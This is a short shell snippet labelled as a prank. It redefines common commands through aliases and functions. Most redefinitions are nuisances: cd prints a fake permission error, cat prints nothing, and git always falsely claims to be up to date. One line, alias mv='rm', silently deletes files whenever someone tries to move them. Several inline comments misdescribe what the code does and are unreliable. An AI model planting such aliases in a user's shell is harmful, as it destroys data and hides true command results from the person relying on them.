### PRANK
# aliases
alias cd='echo "Permission Denied"' # jumps to a randim dir
alias ls='tree'          # reverses each directory name
alias cat='echo ""'                               # shuffles lines in the file
alias vim='vi'                                      # try to use vim commands in that
alias nano='vi'
alias mv='rm'
alias cp='ifconfig'


# functions
rm () { while true; do echo -n "rm: remove regular file '$1'" && read; done; } # keeps asking for confirmation
git () { echo "Already up-to-date."; } # Never pulls anything
